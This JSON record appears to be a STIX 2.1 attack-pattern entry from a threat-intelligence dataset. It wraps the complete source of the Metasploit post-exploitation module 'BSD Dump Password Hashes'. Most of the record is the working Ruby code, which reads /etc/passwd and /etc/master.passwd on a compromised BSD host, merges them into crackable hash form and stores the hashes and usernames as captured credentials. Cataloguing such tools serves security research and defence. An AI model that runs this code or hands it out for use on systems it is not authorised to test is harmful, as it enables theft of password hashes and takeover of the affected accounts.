{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c2954663-a926-4b3c-9766-d95518d38552",
    "created": "2024-08-14T16:33:13.57659Z",
    "modified": "2024-08-14T16:33:13.576594Z",
    "name": "BSD Dump Password Hashes",
    "description": "Post module to dump the password hashes for all users on a BSD system. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/bsd/gather/hashdump.rb",
            "external_id": "hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'BSD Dump Password Hashes',\n        'Description' => %q{ Post module to dump the password hashes for all users on a BSD system. },\n        'License' => MSF_LICENSE,\n        'Author' => ['bcoles'],\n        'Platform' => ['bsd'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  def run\n    unless is_root?\n      fail_with Failure::NoAccess, 'You must run this module as root!'\n    end\n\n    passwd = read_file('/etc/passwd').to_s\n    unless passwd.blank?\n      p = store_loot('passwd', 'text/plain', session, passwd, 'passwd', 'BSD passwd file')\n      vprint_good(\"passwd saved in: #{p}\")\n    end\n\n    master_passwd = read_file('/etc/master.passwd').to_s\n    unless master_passwd.blank?\n      p = store_loot('master.passwd', 'text/plain', session, master_passwd, 'master.passwd', 'BSD master.passwd file')\n      vprint_good(\"master.passwd saved in: #{p}\")\n    end\n\n    # Unshadow passswords\n    john_file = unshadow(passwd, master_passwd)\n    return if john_file == ''\n\n    john_file.each_line do |l|\n      hash_parts = l.split(':')\n      jtr_format = Metasploit::Framework::Hashes.identify_hash hash_parts[1]\n\n      if jtr_format.empty? # overide the default\n        jtr_format = 'des,bsdi,sha512,crypt'\n      end\n\n      credential_data = {\n        jtr_format: jtr_format,\n        origin_type: :session,\n        post_reference_name: refname,\n        private_type: :nonreplayable_hash,\n        private_data: hash_parts[1],\n        session_id: session_db_id,\n        username: hash_parts[0],\n        workspace_id: myworkspace_id\n      }\n\n      create_credential(credential_data)\n      print_good(l.chomp)\n    end\n\n    p = store_loot('bsd.hashes', 'text/plain', session, john_file, 'unshadowed.passwd', 'BSD Unshadowed Password File')\n    print_good(\"Unshadowed Password File: #{p}\")\n  end\n\n  def unshadow(pf, sf)\n    unshadowed = ''\n\n    sf.each_line do |sl|\n      pass = sl.scan(/^\\w*:([^:]*)/).join\n\n      next if pass == '*'\n      next if pass == '!'\n\n      user = sl.scan(/(^\\w*):/).join\n      pf.each_line do |pl|\n        next unless pl.match(/^#{user}:/)\n\n        unshadowed << pl.gsub(/:\\*:/, \":#{pass}:\")\n      end\n    end\n\n    unshadowed\n  end\nend\n",
    "x_mitre_platforms": [
        "['bsd']"
    ]
}